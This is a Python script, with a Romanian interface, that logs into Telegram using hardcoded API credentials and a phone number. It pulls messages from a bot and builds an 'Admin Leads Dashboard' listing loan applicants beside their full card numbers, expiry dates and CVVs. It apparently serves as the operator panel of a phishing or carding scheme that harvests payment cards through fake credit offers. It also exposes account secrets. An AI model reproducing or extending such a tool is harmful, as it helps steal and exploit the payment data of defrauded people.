from telethon import TelegramClient
import asyncio
import json
import webbrowser
import os
import time
import threading

API_ID = 25857306
API_HASH = '4f8f637d699905e4b6e18f6dbf590533'
PHONE_NUMBER = '+373 60 535 689'
BOT_USERNAME = 'onecleads_bot'

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8">
  <title>Admin Leads Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Poppins:wght@600&display=swap" rel="stylesheet">
  <style>
    body {{
      background: linear-gradient(120deg, #0a1833 60%, #38ffb3 200%);
      font-family: 'Inter', Arial, sans-serif;
      color: #fff;
      margin: 0;
      min-height: 100vh;
    }}
    .container {{
      max-width: 1200px;
      margin: 0 auto;
      padding: 32px 12px;
    }}
    h1 {{
      font-family: 'Poppins', Arial, sans-serif;
      color: #38ffb3;
      font-size: 2.2rem;
      margin-bottom: 32px;
      text-align: center;
      font-weight: 700;
      letter-spacing: 1px;
    }}
    .tabs {{
      display: flex;
      justify-content: center;
      gap: 24px;
      margin-bottom: 32px;
    }}
    .tab-btn {{
      background: none;
      border: 2px solid #38ffb3;
      color: #38ffb3;
      font-family: 'Poppins', Arial, sans-serif;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 24px;
      padding: 10px 32px;
      cursor: pointer;
      transition: background 0.2s, color 0.2s;
    }}
    .tab-btn.active, .tab-btn:hover {{
      background: #38ffb3;
      color: #0a1833;
    }}
    .leads-grid {{
      display: flex;
      flex-wrap: wrap;
      gap: 28px;
      justify-content: center;
    }}
    .lead-card {{
      background: rgba(255,255,255,0.06);
      border: 1.5px solid #38ffb3;
      border-radius: 18px;
      box-shadow: 0 4px 32px #38ffb320;
      padding: 28px 22px 18px 22px;
      min-width: 290px;
      max-width: 340px;
      width: 100%;
      margin-bottom: 12px;
      transition: transform 0.22s, box-shadow 0.22s;
      position: relative;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }}
    .lead-card.has-card {{
      border: 2.5px solid #ffe066;
      box-shadow: 0 4px 32px #ffe06640;
    }}
    .lead-card:hover {{
      transform: scale(1.035) translateY(-2px);
      box-shadow: 0 8px 32px #38ffb340, 0 0 0 2px #38ffb3;
      z-index: 2;
    }}
    .lead-id {{
      color: #38ffb3;
      font-weight: 700;
      font-size: 1.1rem;
      margin-bottom: 4px;
      font-family: 'Poppins', Arial, sans-serif;
    }}
    .lead-date {{
      color: #b6ffe2;
      font-size: 0.98rem;
      margin-bottom: 10px;
    }}
    .lead-info {{
      color: #fff;
      font-size: 1.05rem;
      line-height: 1.6;
      margin-bottom: 8px;
      white-space: pre-line;
    }}
    .lead-telegram {{
      color: #38ffb3;
      font-weight: 600;
      font-size: 1.08rem;
      margin-top: 6px;
      word-break: break-all;
    }}
    .card-details {{
      background: rgba(255,255,255,0.09);
      border-radius: 10px;
      padding: 10px 12px;
      margin-top: 10px;
      color: #ffe066;
      font-size: 1.01rem;
      font-family: 'Inter', Arial, sans-serif;
      word-break: break-all;
    }}
    .card-details span {{
      color: #fff;
      font-weight: 600;
    }}
    .no-leads {{
      color:#fff;font-size:1.2rem;
      margin: 32px 0;
      text-align: center;
      width: 100%;
    }}
    @media (max-width: 700px) {{
      .leads-grid {{
        flex-direction: column;
        align-items: center;
      }}
      .lead-card {{
        min-width: 90vw;
        max-width: 98vw;
      }}
    }}
  </style>
</head>
<body>
  <div class="container">
    <h1>Leads din Telegram Bot</h1>
    <div class="tabs">
      <button class="tab-btn active" onclick="showTab('all')">Toate Lead-urile</button>
      <button class="tab-btn" onclick="showTab('withcard')">Lead-uri cu Card</button>
      <button class="tab-btn" onclick="showTab('nocard')">Lead-uri fără Card</button>
      <button class="tab-btn" onclick="location.reload()" style="margin-left:24px;background:#ffe066;color:#0a1833;border-color:#ffe066;">Refresh</button>
    </div>
    <div id="leads-all" class="leads-grid">{all_cards}</div>
    <div id="leads-withcard" class="leads-grid" style="display:none;">{withcard_cards}</div>
    <div id="leads-nocard" class="leads-grid" style="display:none;">{nocard_cards}</div>
  </div>
  <script>
    function showTab(tab) {{
      document.getElementById('leads-all').style.display = (tab === 'all') ? '' : 'none';
      document.getElementById('leads-withcard').style.display = (tab === 'withcard') ? '' : 'none';
      document.getElementById('leads-nocard').style.display = (tab === 'nocard') ? '' : 'none';
      var btns = document.querySelectorAll('.tab-btn');
      btns.forEach((b,i) => {{
        b.classList.toggle('active', 
          (tab === 'all' && i===0) ||
          (tab === 'withcard' && i===1) ||
          (tab === 'nocard' && i===2)
        );
      }});
    }}
  </script>
</body>
</html>
"""

def parse_leads_from_messages(messages):
    # Parse messages into two dicts: requests and cards, both by lead_id
    requests = {}
    cards = {}
    for msg in messages:
        text = None
        if hasattr(msg, "text") and msg.text:
            text = msg.text
        elif hasattr(msg, "message") and msg.message:
            text = msg.message
        if not text:
            continue
        try:
            data = json.loads(text)
            if (
                isinstance(data, dict)
                and data.get("message_type") == "Credit_Request"
                and "lead_id" in data
                and "client" in data
            ):
                requests[data["lead_id"]] = data
            elif (
                isinstance(data, dict)
                and data.get("message_type") == "Credit_Aply_Card"
                and "lead_id" in data
                and "card" in data
            ):
                cards[data["lead_id"]] = data["card"]
        except Exception:
            continue
    return requests, cards

def lead_to_card_html(lead, card=None):
    c = lead["client"]
    info = (
        f"Nume: {c.get('full_name','')}\n"
        f"Țara: {c.get('country','')}\n"
        f"Lucrează: {'Da' if c.get('employed') else 'Nu'}\n"
        f"Suma solicitată: {c.get('requested_amount','')}"
    )
    telegram = c.get('telegram', '')
    card_html = ""
    card_class = ""
    if card:
        card_html = (
            f'<div class="card-details">'
            f'<span>Card:</span><br>'
            f'Număr: {card.get("number","")}<br>'
            f'Expirare: {card.get("expiration","")}<br>'
            f'CVV: {card.get("cvv","")}'
            f'</div>'
        )
        card_class = " has-card"
    return f"""
    <div class="lead-card{card_class}">
      <div class="lead-id">Lead ID: {lead['lead_id']}</div>
      <div class="lead-date">Data: {lead['date']} &nbsp; Ora: {lead['time']}</div>
      <div class="lead-info">{info}</div>
      <div class="lead-telegram">Telegram: {telegram}</div>
      {card_html}
    </div>
    """

async def fetch_leads():
    client = TelegramClient('session_adminpanel', API_ID, API_HASH)
    await client.start(PHONE_NUMBER)
    bot_entity = await client.get_entity(BOT_USERNAME)
    messages = []
    async for msg in client.iter_messages(bot_entity, limit=500):
        messages.append(msg)
    await client.disconnect()
    return messages

def generate_dashboard_html(messages):
    requests, cards = parse_leads_from_messages(messages)
    all_cards_html = []
    withcard_cards_html = []
    nocard_cards_html = []

    for lead_id, lead in requests.items():
        card = cards.get(lead_id)
        html = lead_to_card_html(lead, card)
        all_cards_html.append(html)
        if card:
            withcard_cards_html.append(html)
        else:
            nocard_cards_html.append(html)

    if not all_cards_html:
        all_cards_html = ["<div class='no-leads'>Nu există lead-uri găsite.</div>"]
    if not withcard_cards_html:
        withcard_cards_html = ["<div class='no-leads'>Nu există lead-uri cu card.</div>"]
    if not nocard_cards_html:
        nocard_cards_html = ["<div class='no-leads'>Toți clienții au card.</div>"]

    html = HTML_TEMPLATE.format(
        all_cards="\n".join(all_cards_html),
        withcard_cards="\n".join(withcard_cards_html),
        nocard_cards="\n".join(nocard_cards_html)
    )
    return html

def write_and_open_dashboard(html):
    out_path = os.path.join(os.path.dirname(__file__), "leads_dashboard.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"Dashboard generat: {out_path}")
    # Deschide browser doar la prima rulare
    if not getattr(write_and_open_dashboard, "_opened", False):
        webbrowser.open("file://" + os.path.abspath(out_path))
        write_and_open_dashboard._opened = True

def monitor_loop(interval_sec=10):
    print("Monitorizare continuă... (refresh în browser pentru actualizare)")
    last_hash = None
    while True:
        try:
            messages = asyncio.run(fetch_leads())
            html = generate_dashboard_html(messages)
            # Scrie doar dacă s-a schimbat conținutul
            new_hash = hash(html)
            if new_hash != last_hash:
                write_and_open_dashboard(html)
                last_hash = new_hash
        except Exception as e:
            print("Eroare la monitorizare:", e)
        time.sleep(interval_sec)

def main():
    # Rulează monitorizarea într-un thread separat pentru a permite Ctrl+C
    t = threading.Thread(target=monitor_loop, daemon=True)
    t.start()
    print("Dashboard-ul rulează. Poți da refresh în browser pentru a vedea modificările.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nMonitorizare oprită.")

if __name__ == "__main__":
    main()